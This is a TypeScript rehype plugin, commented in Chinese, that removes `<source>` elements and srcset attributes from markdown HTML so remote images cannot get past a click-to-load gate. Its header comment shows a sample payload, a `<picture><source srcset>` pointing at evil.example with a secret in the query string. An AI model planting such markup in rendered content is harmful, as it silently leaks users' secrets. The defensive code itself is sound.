/**
 * rehype：剥掉 markdown 里原始 HTML 带进来的「多源图片」通道——`<source>` 元素与任意元素上的 `srcset`。
 *
 * 为什么要：远程图的「默认不加载、点击才加载」闸门在组件层（MarkdownImage 的 `img` 槽，见 lib/remote-image-gate）。
 * 但 Streamdown 默认的 sanitize schema 放行了 `<picture>` / `<source srcset>`：
 *   `<picture><source srcset="https://evil.example/p?d=<密钥>"><img src="/api/local-image?path=…"></picture>`
 * 能原样走到 DOM，浏览器按 `<source>` 的 srcset 选图、**自动**请求远程地址——`img` 槽根本没机会拦（那条请求是 `<source>` 触发的，
 * `<img>` 自己的 src 是本地图）。所以这类通道必须在 AST 层就拿掉，不能指望组件层。
 *
 * 放在 sanitize 之后、harden 之前（见 lib/streamdown-options 的 STREAMDOWN_REHYPE_PLUGINS）：作为 sanitize 放行范围的最终闸门，
 * 即使以后 sanitize 的 schema 被放宽（修订视图就是在这张表上再派生一份）也不会把这条路重新打开。
 * `<picture>` 本身保留、里面的 `<img>` 照常走 MarkdownImage；只是不再有 `<source>` 能改写它的来源。
 */

import type { Plugin } from "unified";

type HastNode = {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
};

/** hast 的属性名是 camelCase（`srcSet`）；保险起见 kebab / 小写写法也一并剥 */
const SRCSET_PROPS = ["srcSet", "srcset", "src-set"] as const;

const walk = (node: HastNode): void => {
  if (!Array.isArray(node.children)) return;
  node.children = node.children.filter(
    (child) => !(child.type === "element" && child.tagName?.toLowerCase() === "source"),
  );
  for (const child of node.children) {
    if (child.type === "element" && child.properties) {
      for (const prop of SRCSET_PROPS) delete child.properties[prop];
    }
    walk(child);
  }
};

export const rehypeStripMediaSources: Plugin = () => {
  return (tree: unknown) => {
    walk(tree as HastNode);
  };
};
